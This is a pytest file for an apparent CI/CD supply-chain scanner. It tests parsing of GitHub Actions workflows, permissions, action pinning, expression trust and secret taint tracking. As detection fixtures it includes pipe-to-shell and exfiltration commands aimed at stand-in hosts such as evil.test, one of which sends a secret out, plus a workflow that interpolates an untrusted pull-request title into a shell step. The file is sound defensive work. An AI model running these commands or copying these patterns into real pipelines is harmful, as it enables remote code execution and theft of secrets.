"""Parser tests: locations, the ``on:`` trap, and malformed input."""

from __future__ import annotations

import pytest

from supplytrace.cicd.parser.expressions import Trust, find_expressions, secret_references
from supplytrace.cicd.parser.shell import (
    ShellBehaviour,
    analyse_run_block,
    external_urls,
    is_common_ci_host,
)
from supplytrace.cicd.parser.taint import seed_taint, track_secret_flows
from supplytrace.cicd.parser.workflow import (
    parse_action_ref,
    parse_repository_workflows,
    parse_workflow_text,
)

SIMPLE = """\
name: Build
on:
  pull_request_target:
    types: [opened]
permissions:
  contents: write
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - name: Say hello
        run: |
          echo "hello"
          echo "${{ github.event.pull_request.title }}"
"""


class TestTriggerParsing:
    def test_on_key_is_not_lost_to_yaml_boolean_coercion(self) -> None:
        """YAML 1.1 resolves the bare word ``on`` to True.

        A parser that looks up the string "on" finds nothing and reports that
        every workflow ever written has no triggers.
        """

        workflow = parse_workflow_text(SIMPLE, "wf.yml")
        assert workflow.trigger_names == ["pull_request_target"]

    def test_trigger_line_is_recorded(self) -> None:
        workflow = parse_workflow_text(SIMPLE, "wf.yml")
        assert workflow.trigger_lines["pull_request_target"] == 3

    @pytest.mark.parametrize(
        "source,expected",
        [
            ("on: push\njobs: {}\n", ["push"]),
            ("on: [push, pull_request]\njobs: {}\n", ["pull_request", "push"]),
            ("'on':\n  push:\njobs: {}\n", ["push"]),
        ],
    )
    def test_trigger_shorthand_forms(self, source: str, expected: list[str]) -> None:
        assert parse_workflow_text(source, "wf.yml").trigger_names == expected


class TestLocations:
    def test_step_line_points_at_the_identifying_key(self) -> None:
        workflow = parse_workflow_text(SIMPLE, "wf.yml")
        job = workflow.job("build")
        assert job is not None
        assert job.steps[0].location.line == 13  # the `uses:` line
        assert job.steps[1].location.line == 17  # the `name:` line

    def test_run_block_offsets_map_to_real_file_lines(self) -> None:
        """A `run: |` block's script starts on the line after the key."""

        workflow = parse_workflow_text(SIMPLE, "wf.yml")
        step = workflow.job("build").steps[1]
        assert step.line_for_run_offset(0) == 18  # echo "hello"
        assert step.line_for_run_offset(1) == 19  # the interpolated echo

    def test_inline_run_starts_on_its_own_line(self) -> None:
        source = "on: push\njobs:\n  a:\n    steps:\n      - run: echo hi\n"
        step = parse_workflow_text(source, "wf.yml").job("a").steps[0]
        assert step.line_for_run_offset(0) == 5


class TestPermissions:
    def test_job_permissions_replace_workflow_permissions(self) -> None:
        """GitHub does not merge the two blocks; the job's wins outright."""

        workflow = parse_workflow_text(SIMPLE, "wf.yml")
        job = workflow.job("build")
        assert workflow.permissions == {"contents": "write"}
        assert workflow.effective_permissions(job) == {"contents": "read"}
        assert workflow.permissions_origin(job)[0] == "job"

    def test_empty_permissions_block_is_not_absent_permissions(self) -> None:
        """`permissions: {}` is deliberate hardening, the opposite of absent."""

        source = "on: push\npermissions: {}\njobs:\n  a:\n    steps: []\n"
        workflow = parse_workflow_text(source, "wf.yml")
        assert workflow.permissions == {}
        assert workflow.effective_permissions(workflow.job("a")) == {}

    def test_absent_permissions_is_none(self) -> None:
        source = "on: push\njobs:\n  a:\n    steps: []\n"
        workflow = parse_workflow_text(source, "wf.yml")
        assert workflow.effective_permissions(workflow.job("a")) is None

    def test_write_all_shorthand_expands(self) -> None:
        source = "on: push\npermissions: write-all\njobs:\n  a:\n    steps: []\n"
        workflow = parse_workflow_text(source, "wf.yml")
        assert workflow.permissions["contents"] == "write"


class TestSecretScope:
    def test_workflow_level_env_secret_is_in_scope_for_every_job(self) -> None:
        source = """\
on: push
env:
  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
jobs:
  a:
    steps:
      - run: echo hi
"""
        workflow = parse_workflow_text(source, "wf.yml")
        job = workflow.job("a")
        assert job.secrets_used() == []
        assert workflow.secrets_in_scope(job) == ["GITHUB_TOKEN"]


class TestMalformedInput:
    def test_broken_yaml_is_reported_not_raised(self) -> None:
        workflow = parse_workflow_text("on: push\n  bad: [indent\n", "broken.yml")
        assert not workflow.is_parsed
        assert "invalid YAML" in workflow.parse_error

    def test_empty_file_is_reported(self) -> None:
        assert parse_workflow_text("", "empty.yml").parse_error == "file is empty"

    def test_non_mapping_top_level_is_reported(self) -> None:
        workflow = parse_workflow_text("- a\n- b\n", "list.yml")
        assert "must be a mapping" in workflow.parse_error

    def test_missing_workflow_directory_yields_no_workflows(self, tmp_path) -> None:
        assert parse_repository_workflows(tmp_path) == []


class TestActionRefs:
    @pytest.mark.parametrize(
        "raw,pinned",
        [
            ("actions/checkout@v4", False),
            ("actions/checkout@main", False),
            ("owner/action@v1.2.3", False),
            ("a" * 40, False),
            ("actions/checkout@8f4b7f84864484a7bf31766abe9204da3cbe65b3", True),
            ("actions/checkout@8F4B7F84864484A7BF31766ABE9204DA3CBE65B3", False),
        ],
    )
    def test_only_a_full_lowercase_sha_counts_as_pinned(
        self, raw: str, pinned: bool
    ) -> None:
        assert parse_action_ref(raw).is_pinned is pinned

    def test_subpath_actions_split_correctly(self) -> None:
        action = parse_action_ref("owner/repo/sub/dir@v1")
        assert (action.owner, action.name, action.path, action.ref) == (
            "owner",
            "repo",
            "sub/dir",
            "v1",
        )

    def test_local_and_docker_actions_are_marked(self) -> None:
        assert parse_action_ref("./.github/actions/x").is_local
        assert parse_action_ref("docker://alpine:3.19").is_docker


class TestExpressions:
    @pytest.mark.parametrize(
        "expression,trust",
        [
            ("${{ github.event.pull_request.title }}", Trust.UNTRUSTED),
            ("${{ github.event.comment.body }}", Trust.UNTRUSTED),
            ("${{ github.head_ref }}", Trust.ATTACKER_INFLUENCED),
            ("${{ steps.changed-files.outputs.all_changed_files }}", Trust.ATTACKER_INFLUENCED),
            ("${{ github.repository }}", Trust.TRUSTED),
            ("${{ runner.os }}", Trust.TRUSTED),
            ("${{ matrix.python }}", Trust.TRUSTED),
        ],
    )
    def test_trust_classification(self, expression: str, trust: Trust) -> None:
        refs = find_expressions(expression)
        assert len(refs) == 1
        assert refs[0].trust is trust

    def test_unknown_event_paths_default_to_influenced(self) -> None:
        """Defaulting these to trusted would silently miss new payload fields."""

        refs = find_expressions("${{ github.event.some_future_field }}")
        assert refs[0].trust is Trust.ATTACKER_INFLUENCED

    def test_secret_references_normalise_the_token(self) -> None:
        assert secret_references("${{ secrets.GITHUB_TOKEN }}") == ["GITHUB_TOKEN"]
        assert secret_references("${{ github.token }}") == ["GITHUB_TOKEN"]
        assert secret_references("${{ secrets.A }} ${{ secrets.B }}") == ["A", "B"]


class TestShellAnalysis:
    def test_pipe_to_shell_is_detected(self) -> None:
        hits = analyse_run_block("curl -sL https://evil.test/i.sh | bash")
        assert ShellBehaviour.PIPE_TO_SHELL in {h.behaviour for h in hits}

    def test_commented_out_lines_are_ignored(self) -> None:
        """Teaching repositories are full of commented examples."""

        hits = analyse_run_block("# curl https://evil.test/i.sh | bash\necho ok")
        assert ShellBehaviour.PIPE_TO_SHELL not in {h.behaviour for h in hits}

    def test_hash_inside_quotes_is_not_a_comment(self) -> None:
        hits = analyse_run_block('curl "https://h.test/a#b" | sh')
        assert ShellBehaviour.PIPE_TO_SHELL in {h.behaviour for h in hits}

    def test_publish_and_exfil_commands(self) -> None:
        assert ShellBehaviour.PACKAGE_PUBLISH in {
            h.behaviour for h in analyse_run_block("npm publish --access public")
        }
        assert ShellBehaviour.OUTBOUND_NETWORK in {
            h.behaviour for h in analyse_run_block("curl -d @/tmp/x https://h.test")
        }

    def test_common_ci_hosts_are_recognised_including_subdomains(self) -> None:
        assert is_common_ci_host("https://github.com/x")
        assert is_common_ci_host("https://uk.archive.ubuntu.com/x")
        assert not is_common_ci_host("https://evil.test/x")

    def test_external_urls_excludes_ci_infrastructure(self) -> None:
        script = "curl https://github.com/a\ncurl https://evil.test/b"
        assert external_urls(script) == ["https://evil.test/b"]


class TestTaint:
    def test_a_secret_reaching_echo_is_a_flow(self) -> None:
        seeded = seed_taint([{"KEY": "${{ secrets.API_KEY }}"}])
        result = track_secret_flows('echo "value is $KEY"', seeded)
        assert [f.secret for f in result.flows] == ["API_KEY"]

    def test_printing_something_else_is_not_a_flow(self) -> None:
        """The precision that makes the rule worth reading."""

        seeded = seed_taint([{"KEY": "${{ secrets.API_KEY }}"}])
        assert track_secret_flows('echo "build finished"', seeded).flows == []

    def test_derivation_is_followed_and_marked(self) -> None:
        seeded = seed_taint([{"SA": "${{ secrets.GCP_KEY }}"}])
        script = 'PRIV=$(echo $SA | jq -r .private_key)\necho "key: $PRIV"'
        result = track_secret_flows(script, seeded)
        assert len(result.flows) == 1
        flow = result.flows[0]
        assert flow.secret == "GCP_KEY"
        assert flow.via == "PRIV"
        # A derived value no longer matches GitHub's log mask.
        assert flow.derived is True

    def test_assignment_alone_is_not_a_sink(self) -> None:
        seeded = seed_taint([{"KEY": "${{ secrets.API_KEY }}"}])
        assert track_secret_flows("COPY=$KEY", seeded).flows == []

    def test_flow_to_network_is_captured(self) -> None:
        seeded = seed_taint([{"KEY": "${{ secrets.API_KEY }}"}])
        result = track_secret_flows('curl -d "k=$KEY" https://evil.test', seeded)
        assert ShellBehaviour.OUTBOUND_NETWORK in {f.behaviour for f in result.flows}
